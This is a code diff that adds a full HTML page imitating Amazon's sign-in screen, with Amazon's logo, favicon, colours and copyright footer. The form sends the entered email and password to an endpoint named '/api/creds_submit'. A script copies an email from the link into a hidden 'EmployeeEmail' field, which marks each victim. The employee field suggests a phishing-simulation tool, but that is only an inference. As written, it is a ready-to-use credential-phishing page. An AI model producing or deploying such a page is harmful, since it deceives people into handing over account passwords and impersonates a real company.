@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Amazon Sign-In</title>
+    <link rel="icon" href="https://www.amazon.com/favicon.ico" type="image/x-icon">
+    <style type="text/css">
+        body {
+            font-family: "Amazon Ember", "Helvetica Neue", Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            color: #111;
+        }
+
+        .logo {
+            text-align: center;
+            margin-top: 30px;
+            margin-bottom: 18px;
+        }
+
+        .logo img {
+            width: 103px;
+            height: 31px;
+        }
+
+        .signin-box {
+            max-width: 350px;
+            margin: 0 auto;
+            padding: 20px 26px 26px 26px;
+            border: 1px solid #d5d9d9;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            background-color: #fff;
+        }
+
+        .signin-box h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 22px;
+        }
+
+        label {
+            font-weight: 700;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 11px 10px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+            margin-bottom: 14px;
+            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #e77600;
+            box-shadow: 0 0 3px 2px rgba(228,121,17,0.5);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            background-color: #FFD814;
+            border: 1px solid #FCD200;
+            border-radius: 20px;
+            padding: 10px 0;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s ease-in-out;
+        }
+
+        button:hover {
+            background-color: #f7ca00;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+            margin: 40px auto 20px auto;
+            line-height: 2;
+        }
+
+        .footer a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 11px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+<div class="logo">
+    <img alt="Amazon Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" />
+</div>
+
+<div class="signin-box">
+    <h1>Sign in</h1>
+
+    <form method="POST" action="/api/creds_submit">
+        <label for="email">Email or mobile phone number</label>
+        <input id="email" name="email" required type="text" />
+
+        <label for="password">Password</label>
+        <input id="password" name="password" required type="password" />
+
+        <input type="hidden" id="originalEmail" name="EmployeeEmail" />
+
+        <button type="submit">Sign-In</button>
+    </form>
+
+    <div class="footer">
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Help</a><br/>
+        © 1996-2025, Amazon.com, Inc. or its affiliates
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailParam = urlParams.get('email');
+
+    if (emailParam) {
+        document.getElementById('originalEmail').value = emailParam;
+    }
+</script>
+
+</body>
+</html>
